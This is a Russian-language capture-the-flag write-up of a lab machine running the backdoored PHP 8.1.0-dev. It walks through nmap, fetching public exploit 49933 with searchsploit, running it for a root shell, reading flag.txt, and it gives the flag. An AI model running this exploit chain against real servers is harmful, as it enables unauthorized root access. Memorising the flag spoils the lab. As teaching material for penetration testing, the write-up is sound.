## Кратко

Машина с единственным открытым портом (80), на котором крутится встроенный PHP-сервер с уязвимой версией PHP 8.1.0-dev. Уязвимость эксплуатируется публичным скриптом, который дает интерактивную оболочку, после чего флаг находится через обход ограничений этой оболочки по навигации между директориями.

## 1. Разведка

### Сканирование портов

```bash
nmap -sV 10.80.179.240
```

```
Nmap scan report for 10.80.179.240
Host is up (0.049s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

Открыт только один порт — 80, на нем встроенный веб-сервер PHP устаревшей dev-версии 8.1.0-dev.

### Поиск эксплойтов

По версии PHP ищем эксплойты через `searchsploit`:

```bash
searchsploit PHP 8.1.0-dev
```

Среди результатов нашелся подходящий:

```
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution | php/webapps/49933.py
```

Скачиваем найденный эксплойт:

```bash
searchsploit -m 49933
```

```
Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
URL: https://www.exploit-db.com/exploits/49933
Path: /usr/share/exploitdb/exploits/php/webapps/49933.py
Copied to: /home/kali/49933.py
```

## 2. Получение доступа

Запускаем эксплойт и указываем адрес цели:

```bash
python 49933.py
```

```
Enter the full host url:
http://10.80.179.240/

Interactive shell is opened on http://10.80.179.240/
Can't acces tty; job crontol turned off.
```

Получена интерактивная оболочка. Команда `whoami` показывает, что права — `root`, однако обычная навигация по директориям (`cd`) не работает: любая попытка сменить каталог не дает эффекта.

Обойти это удалось, объединяя переход и вывод содержимого в одну команду через `&&`:

```bash
cd ../ && ls
cd ../../ && ls
cd ../../../ && ls
```

На третьем уровне вверх обнаружился файл `flag.txt`. Читаем его тем же способом:

```bash
cat ../../../flag.txt
```

**Флаг:** `flag{4127d0530abf16d6d23973e3df8dbecb}`

## Выводы

- Устаревшая dev-версия PHP (8.1.0-dev), встроенная в веб-сервер, подвержена публичному RCE-эксплойту через заголовок `User-Agent`.
- Ограничение на `cd` в полученной оболочке — особенность самой shell-реализации эксплойта (вероятно, не сохраняет текущую директорию между вызовами), а не полноценная песочница: обходится связкой `cd && ls`/`cat` в одной команде.
- Для prod-окружений: не использовать dev-сборки PHP и держать версии ПО в актуальном состоянии.

## Использованные инструменты

`nmap`, `searchsploit`, Python (`49933.py`)
